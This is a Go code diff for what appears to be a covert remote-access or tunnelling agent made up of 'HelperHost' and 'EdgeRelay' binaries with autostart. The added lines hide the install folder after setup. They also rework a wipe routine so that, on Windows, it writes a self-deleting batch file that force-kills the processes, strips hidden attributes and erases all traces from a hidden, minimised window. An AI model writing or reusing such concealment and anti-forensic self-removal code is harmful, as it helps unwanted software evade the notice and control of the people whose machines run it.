@@ -70,6 +70,7 @@ func initPaths() {
 		edgePath = filepath.Join(dir, edgeName)
 		helperPath = filepath.Join(dir, helperName)
 	}
+	hideInstallTree()
 }
 
 func logf(msg string) {
@@ -460,8 +461,17 @@ func wipeAll() {
 	killTunnelOnly()
 	scrubShellArtifacts()
 
+	// Unhide so delete tools can see paths, then wipe what we can now.
+	unhidePath(dir)
+	unhidePath(cacheDir)
+	_ = filepath.Walk(dir, func(p string, info os.FileInfo, err error) error {
+		if err == nil {
+			unhidePath(p)
+		}
+		return nil
+	})
+
 	secureRmTree(cacheDir)
-	secureRmTree(dir)
 	home, _ := os.UserHomeDir()
 	secureRmTree(filepath.Join(home, ".agentshe"))
 	if runtime.GOOS == "windows" {
@@ -472,15 +482,25 @@ func wipeAll() {
 		if tmp := os.Getenv("TEMP"); tmp != "" {
 			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
 		}
-
-		delayed := fmt.Sprintf(
-			`ping 127.0.0.1 -n 4 >nul & rmdir /s /q "%s" & rmdir /s /q "%s"`,
-			dir, cacheDir,
-		)
-		cmd := exec.Command("cmd", "/C", delayed)
+		// Running .exe stays locked until process exits — finish wipe from a temp bat.
+		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
+		body := "@echo off\r\n" +
+			"ping 127.0.0.1 -n 3 >nul\r\n" +
+			"taskkill /F /IM HelperHost.exe >nul 2>&1\r\n" +
+			"taskkill /F /IM EdgeRelay.exe >nul 2>&1\r\n" +
+			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"attrib -h -s /s /d \"" + dir + "\\*\" >nul 2>&1\r\n" +
+			"attrib -h -s \"" + dir + "\" >nul 2>&1\r\n" +
+			"attrib -h -s \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"" + dir + "\" >nul 2>&1\r\n" +
+			"rmdir /s /q \"" + cacheDir + "\" >nul 2>&1\r\n" +
+			"del \"%~f0\" >nul 2>&1\r\n"
+		_ = os.WriteFile(bat, []byte(body), 0o644)
+		cmd := exec.Command("cmd", "/C", "start", "", "/MIN", bat)
 		hideWindow(cmd)
 		_ = cmd.Start()
 	} else {
+		secureRmTree(dir)
 		secureRmTree("/tmp/HelperHostCache")
 		if t := os.Getenv("TMPDIR"); t != "" {
 			secureRmTree(filepath.Join(t, "HelperHostCache"))
@@ -786,6 +806,7 @@ func main() {
 	acquireLock()
 	ensureHelperPresent()
 	info := installAutostart()
+	hideInstallTree()
 	port, err := findFreePort()
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "FAIL: %v\n", err)
